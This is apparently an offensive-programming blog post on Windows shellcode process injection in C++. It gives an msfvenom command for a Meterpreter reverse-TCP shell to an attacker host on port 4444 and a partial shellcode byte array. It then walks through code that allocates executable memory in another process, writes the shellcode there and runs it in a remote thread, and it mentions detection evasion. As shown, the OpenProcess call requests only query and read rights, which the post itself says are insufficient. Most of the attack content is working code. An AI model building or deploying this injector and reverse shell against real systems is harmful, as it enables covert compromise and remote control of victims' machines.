---
title: Offensive C++ - Process Injection (ShellCode)
author: nirajkharel
date: 2024-06-27 15:10:00 +0800
categories: [Red Teaming, Offensive Programming]
tags: [Red Teaming, Offensive Programming]
render_with_liquid: false
---


## Process Injection - Shellcode

In this blog, we are going to discuss how we can perform a generic shellcode injection inside a running process and the functions needed to do it.

Generally, shellcode injection in a process refers to injecting portable executable (PE) code into the virtual address space of the running process and then executing it via a new thread. It can also be a potential technique to avoid detection and gain the elevated privileges of the running process. The flowchart below describes the process that should be followed during the injection. The general process consists of:
- Identifying the running process
- Obtaining the handle to the process
- Allocating the buffer in the virtual address space of the process
- Creating and writing the shellcode into the allocated buffer
- Creating a thread that runs in the virtual address space of the process, aka executing the shellcode

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/proc-injection-shellcode.png">


**Creating a Shellcode**    
We can use msfvenom to generate a generic reverse shell shellcode using below command.
```bash
msfvenom -platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=4444 -f c --var-name=wannabe

unsigned char wannabe[] =
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
.............[snip]......
"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
"\xf0\xb5\xa2\x56\xff\xd5";
```

**Enumerating the Running Process**
We have previously discussed the enumeration of processes and their entities such as process IDs and process names in previous blogs. You can refer to this link for more information on the **[ToolHelp32](https://nirajkharel.com.np/posts/process-enumeration-toolhelp32/)** function. Process enumeration can also be achieved using other methods like the **[Windows Terminal Services API](https://nirajkharel.com.np/posts/process-enumeration-windows-terminal-services/)**, **[EnumProcess](https://nirajkharel.com.np/posts/process-enumeration-enum-process/)**, or **[NtQuerySystemInformation](https://nirajkharel.com.np/posts/process-enumeration-ntqueryinformation/)**.

Define the function for process Id enumeration and call it within the **main** function.
```c++
void FindProcess() {
    // Your Code here
}

int main(){
    FindProcess();

    // Provide the Proces Ids and take an input from the user for the process they want to enumerate the modules for.
    DWORD pid;
    cout << "\n\nEnter ProcessId: ";
    cin >> pid;
    
    // Pass the Process Id to FindProcessModule
    InjectShellcode(pid);
}
```

Once we have enumerate the running processes and the process Ids associated with them, we need to open the handle to the proccess that we want to inject our code. Here I have described the impelementation of the [**Open Process**](https://nirajkharel.com.np/posts/process-module-enumeration/#openprocess) function.
```c++
void InjectShellcode(DWORD pid) {

    // shellcode
    unsigned char wannabe[] = "\xfc ...[snip]...\xd5";

    // Needed parameters for OpenProcess
    HANDLE hProcess;
    BOOL bInHandle;
    DWORD dwProcessId = pid;

    // Opening the handle of the process. PROCESS_QUERY_INFORMATION and PROCESS_VM_READ is needed for GetModuleFileNameEx function
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcessId);

    if (hProcess == NULL){
        cout << "\nUnable to Identify the Process ID\n";
        return;
    }
``` 

**Buffer Allocation -** [**VirtualAllocEx**](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)

As we discussed earlier, we need to allocate our buffer into the virtual address space of the running process. Before that, we need to allocate/reserve the region of the memory within the virtual address space. This can be done using VirtualAllocEx function of the windows API

**SYNTAX**
```c++
LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```

The `VirtualAllocEx` function returns the base address of the allocated memory region if it succeeds and returns `NULL` if it fails.
- **HANDLE hProcess**: Contains the handle to the process where the allocation needs to occur. For successful execution, the handle must have the `PROCESS_VM_OPERATION` access right. Therefore, while using the **OpenProcess** function, this right needs to be defined already.
- **LPVOID lpAddress**: An optional parameter that defines the starting address of the allocation within the virtual address space. It can be set to `NULL` to allow the program to determine the allocation region automatically.
- **SIZE_T dwSize**: Contains the size of the allocated region that we need to allocate. This means the size of our shellcode.
- **DWORD flAllocationType**: Contains the type of memory allocation that we need to define. Microsoft has provided a list of such types depending on the requirements. As we are reserving the region of the virtual address and then committing our shellcode, to do that in a single step, it is recommended to use `MEM_COMMIT | MEM_RESERVE`. There are additional types like `MEM_RESET`, `MEM_RESET_UNDO`, `MEM_LARGE_PAGES`, `MEM_PHYSICAL`, and `MEM_TOP_DOWN` if you would like to explore.
- **DWORD flProtect**: Contains the memory protection constants defined by Microsoft. We will be using `PAGE_EXECUTE_READWRITE` values for it since we need to allocate the memory region, write into that region, and execute the shellcode. You can explore other [constants here.](https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants)

Once we are ready with the function and its parameters, let's define it inside our `InjectShellcode` function.
 

```c++

    // Define the neede parameters.
    LPVOID lpAddress = NULL; // NULL to instruct program to figure out the starting region by themselves
    SIZE_T dwSize = sizeof(wannabe); // Size of the shellcode
    DWORD flAllocationType = (MEM_COMMIT | MEM_RESERVE); // Reserve and commit in sigle step 
    DWORD flProtect = PAGE_EXECUTE_READWRITE; // Necessary permission to write and execute the shellcode

// Define the function VirtualAllocEx
    LPVOID lpAlloc = VirtualAllocEx(hProcess, 
    lpAddress, dwSize, flAllocationType, flProtect);
  	if (lpAlloc == NULL){
  		printf("\nFailed to Allocate the memory\n");
  		CloseHandle(hProcess);
  		return;
  	}
    printf("Allocated the memory into virtual space");
```

**Write Buffer into the Allocated Memory -** **[WriteProcessMemory]**(https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
Once we have allocated our memory into the virtual address space, the next process is to write the buffer (shellcode) into that memory space. In order for this function to execute successfully, the handle to the process must contain **PROCESS_VM_WRITE** and **PROCESS_VM_OPERATION** access. Therefore, it is necessary to define such access while creating a handle to the process using **OpenProcess**. The return type for this function when it succeeds is nonzero and returns 0 when it fails. It contains five parameters in which four are input parameters and one is output.

**SYNTAX**
```c++
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
```
- **HANDLE hProcess**: Contains the handle to the process where we need to write the buffer.
- **LPVOID lpBaseAddress**: A pointer to the base address where we need to write the buffer. It's the return value of VirtualAllocEx.
- **LPCVOID lpBuffer**: A pointer to the shellcode buffer.
- **SIZE_T nSize**: Size of the buffer.
- **SIZE_T \*lpNumberOfBytesWritten***: Output variable which provides the number of bytes written to the memory address.

So generally, here we are accessing the handle of the process, navigating through the address allocation provided by VirtualAllocEx, and writing the buffer into the allocated memory.

```c++
    // Declare the parameters for WriteProcessMemory
    LPVOID lpBaseAddress = lpAlloc;
    LPCVOID lpBuffer = wannabe;
    SIZE_T nSize = sizeof(wannabe) - 1;
    SIZE_T lpNumberOfbytesWritten;

  	BOOL bWriteBuffer = WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, &lpNumberOfbytesWritten);
  	
    if (bWriteBuffer == FALSE){
  		printf("Failed to Write Memory to the process\n");
  		CloseHandle(hProcess);
  		return;
  	}

  	printf("Successfully wrote memory to the process\n");
```

**Execute the Shellcode -** **[CreateRemoteThreadEx](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethreadex)**
Once we have our shellcode written into the memory address, we can execute that shellcode using a new thread. A running process contains a number of threads running inside it which have their own objectives. A thread can execute any part of the code in the process; therefore, our shellcode could be executed as well. We just need to provide it a clear instruction about the location of our shellcode. It returns a handle to the new thread when it succeeds and the return value will be NULL if it fails.

```c++
HANDLE CreateRemoteThreadEx(
  [in]            HANDLE                       hProcess,
  [in, optional]  LPSECURITY_ATTRIBUTES        lpThreadAttributes,
  [in]            SIZE_T                       dwStackSize,
  [in]            LPTHREAD_START_ROUTINE       lpStartAddress,
  [in, optional]  LPVOID                       lpParameter,
  [in]            DWORD                        dwCreationFlags,
  [in, optional]  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
  [out, optional] LPDWORD                      lpThreadId
);
```
- **HANDLE hProcess**: Contains the handle to the process. In order for this to execute successfully, while defining **OpenProcess** functions it must be defined with access rights as `PROCESS_CREATE_THREAD`, `PROCESS_QUERY_INFORMATION`, `PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, and `PROCESS_VM_READ`.
- **LPSECURITY_ATTRIBUTES lpThreadAttributes**: Defines whether a child process can inherit the returned handle. We do not need that as we do not want our shellcode to be executed on the child process. We can set this as `NULL`.
- **SIZE_T dwStackSize**: Defines the size of the [stack](https://learn.microsoft.com/en-us/windows/win32/procthread/thread-stack-size) for the thread. We can set it as 0 to instruct the thread to use the default size of the executable.
- **LPTHREAD_START_ROUTINE lpStartAddress**: Defines the start address of the allocated memory, but Microsoft wants this as an application-defined function of type `LPTHREAD_START_ROUTINE`. This `LPTHREAD_START_ROUTINE` is the thing that will give you the starting address for the thread and is documented under [ThreadProc](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms686736(v=vs.85)?redirectedfrom=MSDN). We discussed earlier that the thread can execute any portion of the memory on the process, but it's obvious that we need to instruct the thread which portion to go and execute. So this can be done by that routine. And since we need our thread to start executing from the starting portion of the allocated memory, the value for it will be `LPTHREAD_START_ROUTINE(lpAlloc)` and lpAlloc contains the return type of VirtualAllocEx.
- **LPVOID lpParameter**: If we want to pass the variable to the thread, then we need to pass the pointer to the variable, but since we have already written our shellcode and do not need this, we can set this as NULL.
- **DWORD dwCreationFlags**: Instructs the thread when to start. We can pass the value 0 to start the thread immediately once created.
- **LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList**: It contains the list of attributes to define how the process or thread behaves and interacts with the system, like the parent process and handle inheritance. Since this is an optional parameter and I do not know what to do with this parameter, we can keep this as NULL.
- **[out, optional] LPDWORD lpThreadId**: It provides the identifier for the thread which executes the shellcode. We can set this as NULL as we do not want this.

```c++

    // Declaring the variables for CreateRemoteThreadEx
    LPSECURITY_ATTRIBUTES lpThreadAttributes = NULL;
    SIZE_T dwStackSize = 0;
    LPTHREAD_START_ROUTINE lpStartAddress = (LPTHREAD_START_ROUTINE)lpAlloc;
    LPVOID lpParameter = NULL;
    DWORD dwCreationFlags = 0;
    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList = 0;
    LPDWORD lpThreadId = NULL;

    // Create a handle to the Thread
    HANDLE hThread = CreateRemoteThreadEx(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags,lpAttributeList, lpThreadId);

  	if (hThread == NULL){
  		printf("Failed Creating a Remote Thread\n");
  		CloseHandle(hProcess);
  		return;
  	}
```

Once we have executed our thread, we need to close the handle to the thread and the process as well. But how does the program know when to close the thread and process? This is where the function **[WaitForSingleObject](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject)** comes in. This function waits until the thread completes its execution and then the program proceeds further to close the handle to the process and thread.

**SYNTAX**
```c++
DWORD WaitForSingleObject(
  [in] HANDLE hHandle,
  [in] DWORD  dwMilliseconds
);
```

- **HANDLE hHandle**: Handle to the process or thread. Since we are waiting for our thread to complete the execution, we will use the handle to the thread.
- **DWORD dwMilliseconds**: Timeout in milliseconds. If we set the value to INFINITE, then the function will return only after the thread completes its work and enters its signaled stage.

```c++
  	WaitForSingleObject(hThread, INFINITE);

  	printf("Successfully injected into process %lu\n", pid);

  	CloseHandle(hThread);
  	CloseHandle(hProcess);

  	return;
```

<br>
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/process-injection-shellcode.gif">

**References**
- [https://www.crow.rip/crows-nest/mal/dev/inject/shellcode-injection](https://www.crow.rip/crows-nest/mal/dev/inject/shellcode-injection)
- [https://redfoxsec.com/blog/process-injection-harnessing-the-power-of-shellcode](https://redfoxsec.com/blog/process-injection-harnessing-the-power-of-shellcode)
- [https://www.ired.team/offensive-security/code-injection-process-injection/process-injection](https://www.ired.team/offensive-security/code-injection-process-injection/process-injection)
- [https://github.com/ZeroMemoryEx/Shellcode-Injector](https://github.com/ZeroMemoryEx/Shellcode-Injector)
- [https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
- [https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
- [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethreadex](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethreadex)
- [https://learn.microsoft.com/en-us/windows/win32/procthread/thread-stack-size](https://learn.microsoft.com/en-us/windows/win32/procthread/thread-stack-size)
- [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)